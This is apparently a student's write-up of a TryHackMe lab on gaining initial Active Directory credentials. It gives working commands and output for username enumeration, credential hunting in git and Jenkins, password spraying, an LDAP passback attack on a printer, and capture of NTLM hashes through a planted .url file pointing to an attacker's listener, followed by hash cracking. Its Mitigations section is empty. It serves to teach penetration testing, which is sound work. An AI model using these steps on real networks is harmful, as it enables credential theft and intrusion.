# Intro to AD Breaching

This write-up covers my understanding of the room and the key concepts I took away from it.

> **TryHackMe Room:** [Intro to AD Breaching](https://tryhackme.com/room/introductiontoactivedirectorybreaching)
> 

## Introduction

By now, I have covered basic Enumeration and authentication in Active Directory. But in real world scenario, to do that, you need set of valid credentials. Without them, you won't be able to enumerate anything in AD nor move laterally and certainly won't be able to escalate privileges. The process of obtaining those initial credentials is called breaching.

First off, the rooms asked you to add multiple IP addresses as with their domain names in `/etc/hosts`. The WebServer hosts three services behind an Nginx reverse proxy, each accessible via its own hostname: `git.thm.loc`, `ci.thm.loc`, and `printer.thm.loc`.

## Active Directory Breaches

In simple terms, AD breaching is the process of obtaining an initial set of valid AD credentials when starting from scratch. It is the very first phase of any AD attack chain. Without that first set of credentials, we can't enumerate the domain, move laterally, or escalate privileges.

As we have already discussed in the Enumeration room, these are the ports that are important in Active Directory environment. And they act as attack surface:

- DNS (TCP/UDP 53)
- Kerberos (TCP/UDP 88/464)
- HTTP/HTTPS
- LDAP (TCP 389/636)
- SMB (TCP 445)

### Starting Positions

- Unauthenticated (Black-Box) - You have the network access but you don't have any valid credentials. This is the classic initial access scenario. 
- Authenticated (Grey-Box) - You have a valid low-level credentials. So, you can skip straight to enumeration and look for escalation paths.

## OSINT And Target Reconnaissance

In the real world scenario, when you start, you don't have anything except those open ports. So, for that you might have to start with OSINT, or other active or passive reconnaissance of the target. The goal at this age is just getting the usernames.

You can do any one or more of these:

- LinkedIn
- GitHub and GitLab
- Public Data breaches
- Corporate Websites
- Job Listings

But in this scenario, the list of usernames are given by the room, so, we do not have to do that. The usernames are of this format:

```text
administrator
admin
guest
claire.ross
mary.jenkins
...
```

There are many common username formats:

- `first.last` - `jane.smith`
- `firstlast` - `janesmith`
- `flast` - `jsmith`
- `first.l` - `jane.s`
- `first` - `jane`
- `last.fast` - `smith.jane`

### Enumerating the usernames

First, we need to figure out if the one or more of the usernames belong in the target network. We can do that with:

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 usernames.txt
```

And then it will reveal which of the usernames is valid to the network. We can add the valid usernames to a separate file called `valid_users.txt`:

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 usernames.txt -o valid_users.txt
```

In both cases, you will have to have the `usernames.txt` file in the current directory you are working.

- `userenum` - Kerbrute module for username enumeration
- `-d thm.loc` - The target domain
- `--dc 192.168.12.100` - The IP address of the domain controller

## Credential Discovery

Now that we know the valid username list, the next step is finding valid credentials. Developers and administrators regularly work with credentials as part of their daily workflows including database connection strings, service account passwords, keys, and deployment secrets. And under pressure to deliver quickly, they often forget to remove them when they deploy their build.

### Hunting Credentials

Two of the places you can find exposed credentials are `git` repositories and in `jenkins`.

In git, there are several places to look:

- Commit history
- Configuration files
- Hardcoded secrets
- CI/CD pipeline definitions

Here is one example:

```bash
git log -p | grep -i "password\|secret\|token\|key\|credential"
```

Places to look in jenkins are:

- Build console output
- Job configurations
- Environment variables
- Workspace files

Here is one command example:

```bash
curl http://ci.thm.loc/job/webapp-deploy/lastStableBuild/console | grep -i "password\|secret\|token\|credential"
```

And if it finds one, it can show it to the output:

```bash
curl http://ci.thm.loc/job/webapp-deploy/lastStableBuild/console | grep -i "password\|secret\|token\|credential"
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100  15676   0  15676   0      0   9380      0           00:01          11728
+ echo     Configuring new user accounts with default password: MegaCorp01!
    Configuring new user accounts with default password: MegaCorp01!
```

### Practical Scenario

In this practical scenario, we have to go to the simulated GitHub and Jenkins lab to find the credentials.

## Username Enumeration and Password Spraying

We now have a default onboarding password from GitHub and Jenkins from earlier. So, now we can check if any one of the users is still using the default password.

### Password Spraying vs Brute-Forcing

- Brute-forcing is when you have a valid username and you don't know the password, so you try using a list of common passwords to see if one of them sticks. Brute forcing rarely works in AD environment because of the lock-out policies.
- Password spraying is when you have a list of valid usernames and one valid password, and trying that password on every valid user to see if at least one user still uses the password. 

### Understanding Lockout Policies

Before spraying, it is important to understand the target domain account's lockout policies. If the policy locks accounts after 5 failed attempts within a 30-minute window, spraying 3 passwords in quick succession is a recipe for disaster as you will lock out every account on your list.

Here is the safe approach:

- Spray one password at a time across the entire user list.
- Wait for the lockout observation window to reset before attempting the next password.
- If you already have one valid credential from an earlier task, you can query the domain's password policy before you spray.

Here is one example:

```bash
nxc smb 192.168.12.100 -u 'svc.jenkins' -p 'Jen5k1ns2025!' --pass-pol
SMB         192.168.12.100  445    RDC1             [*] Windows 10 / Server 2019 Build 17763 x64 (name:RDC1) (domain:thm.loc) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.12.100  445    RDC1             [+] thm.loc\svc.jenkins:Jen5k1ns2025! 
SMB         192.168.12.100  445    RDC1             [+] Dumping password info for domain: THM
SMB         192.168.12.100  445    RDC1             Minimum password length: 8
SMB         192.168.12.100  445    RDC1             Password history length: 12
SMB         192.168.12.100  445    RDC1             Maximum password age: 41 days 23 hours 53 minutes 
SMB         192.168.12.100  445    RDC1             
SMB         192.168.12.100  445    RDC1             Password Complexity Flags: 000001
SMB         192.168.12.100  445    RDC1                 Domain Refuse Password Change: 0
SMB         192.168.12.100  445    RDC1                 Domain Password Store Cleartext: 0
SMB         192.168.12.100  445    RDC1                 Domain Password Lockout Admins: 0
SMB         192.168.12.100  445    RDC1                 Domain Password No Clear Change: 0
SMB         192.168.12.100  445    RDC1                 Domain Password No Anon Change: 0
SMB         192.168.12.100  445    RDC1                 Domain Password Complex: 1
SMB         192.168.12.100  445    RDC1             
SMB         192.168.12.100  445    RDC1             Minimum password age: 1 day 4 minutes 
SMB         192.168.12.100  445    RDC1             Reset Account Lockout Counter: 30 minutes 
SMB         192.168.12.100  445    RDC1             Locked Account Duration: 30 minutes 
SMB         192.168.12.100  445    RDC1             Account Lockout Threshold: 5
SMB         192.168.12.100  445    RDC1             Forced Log off Time: Not Set
```

As we can see, the account lockout threshold is 5 and lockout reset time is 30. So, we can spray up to 4 passwords in 30 minutes.

### Spraying with NetExec

NetExec (nxc) is a powerful network exploitation tool and the successor to the now-archived CrackMapExec. It supports authentication testing across multiple protocols, including , LDAP, WinRM, RDP, and MSSQL, making it an ideal tool for password spraying.

Before spraying, we need to do some cleanup to the username list file so that it's only username and nothing else. We can do that with:

```bash
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt
```

This will save a list of only usernames in a separate file called `clean_users.txt` in your current working directory. Then we can spray with:

```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success
```
Here is what the parameters signify:

- `smb` - SMB protocol on the port 445
- `-u clean_users.txt` - usernames from the `clean_users` file
- `-p 'MegaCorp01!` - One single password
- `--continue-on-success` - It means continue even if it finds a valid username that uses the password

As a result, there are two of the valid usernames that were still using the onboarding password.

```bash
SMB         192.168.12.100  445    RDC1             [-] thm.loc\alex.foster:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [+] thm.loc\dev.intern:MegaCorp01! 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\kate.miller:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\sophie.hall:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\olivia.hunt:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\sam.morgan:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\chris.baker:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\daniel.reed:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\lucy.powell:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\jake.hughes:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\megan.price:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\peter.davies:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\mark.robinson:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\grace.edwards:MegaCorp01! STATUS_LOGON_FAILURE 
SMB         192.168.12.100  445    RDC1             [+] thm.loc\alice.moore:MegaCorp01! 
SMB         192.168.12.100  445    RDC1             [-] thm.loc\amy.fisher:MegaCorp01! STATUS_LOGON_FAILURE 
```

### Interpreting the Results

- `[+]` - Successful authentication
- `[-] STATUS_LOGON_FAILURE` - The password is incorrect.
- `[-] STATUS_ACCOUNT_DISABLED` - The account exists but has been disabled. 
- `[-] STATUS_ACCOUNT_LOCKED_OUT` - The account has been locked out. If you see this, you should stop spraying immediately, because you may be triggering lockouts.
- `(Pwn3d!)` - This is successful authentication on the user who has administrative privileges.

## Coercion Attacks

Coercion tricks a device or user into sending authentication material to an attacker-controlled listener instead of searching for credentials or spraying passwords.

There are two coercion techniques covered in this room: LDAP passback attack against a misconfigured network printer, and file-based coercion on a writable file share.

### LDAP Passback Attack

Passback attacks involve the reconfiguring of network devices to send stored credentials to an attacker. Here is what it means, step by step:

1. Access the device's web-based administration interface (the Embedded Web Service), often using default or weak credentials.
2. Navigate to the LDAP configuration page.
3. Replace the legitimate LDAP server IP address with our attacker machine's IP address.
4. Trigger a connection test as most devices include a "Test Connection" or "Check Connection" button for exactly this purpose.
5. The device sends the stored LDAP credentials to our listener, and we capture them.

It works because most MFPs and IoT devices are among the most overlooked assets during security hardening. Common issues include:

- Default admin credentials
- Over-privileged service accounts
- Plaintext LDAP (port 389)
- No credential rotation

### Practical Scenario

1. First go to the simulated printer site: `http://printer.thm.loc/`.
2. Then access the admin panel with credentials `admin:admin` and locate the LDAP configuration page. The current LDAP server IP and port, along with the service account username are visible there.
3. Change the LDAP server IP address to the `tun0` IP of the room and a different port (such as 3489) and save these settings.
4. And then the on a terminal, there should be a netcat listener listening on the same port.
5. And if we do test connection on the configuration page, the device will attempt to authenticate to our listener using the stored LDAP credentials.

The output would be similar to this:

```bash
nc -lvnp 3489
listening on [any] 389 ...
connect to [YOURIP] from (UNKNOWN) [PRINTERIP] 49562
0Y`T;CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc<REDACTED_PASSWORD>
```

You can verify the captured password like this:

```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
```

### File-Based Coercion

In file-based coercion, we place a specially crafted file on a writable network share. When a user browses that share using Windows Explorer, the operating system automatically attempts to render the file's icon. If the icon path points to a UNC path on our attacker machine (e.g., `\\TUN0_IP\share\icon.ico`), Windows will follow that path and send the browsing user's NTLMv2 hash to our listener, all without the user opening or clicking the file.

### Creating a `.url` file

You can create it with this:

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\YOURTUN0IP\icons\icon.ico
IconIndex=1
EOF
```

Before we put the file and wait for the user to interact with this, we need to set up a listener just like above. But we will use responder. 

```bash
sudo responder -I tun0
```

To put the `.url` file:

```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
smb: \> put @Shortcut.url
putting file @Shortcut.url as \@Shortcut.url (X.X kb/s) (average X.X kb/s)
smb: \> exit
```

And then, once the user interacts with the file, we should see the captured NTLMv2 hash in the responder terminal:

```bash
[SMB] NTLMv2-SSP Client   : 192.168.x.x
[SMB] NTLMv2-SSP Username : THM\sarah.jones
[SMB] NTLMv2-SSP Hash     : sarah.jones::THM:1122334455667788:A1B2C3D4E5F6...[SNIP]
```

We can crack the hash using Hashcat like this:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

You have to put the capture hash in the `hash.txt` file.

These two techniques are just the tip of the iceberg when it comes to authentication coercion. More advanced techniques, including PetitPotam, PrinterBug/SpoolSample, and DFSCoerce, can force domain controllers and other high-value machines to authenticate to an attacker-controlled listener. Combined with relay attacks (where you forward the captured authentication rather than cracking it), these techniques form some of the most potent AD attack chains available today.

## Mitigations

## Conclusion
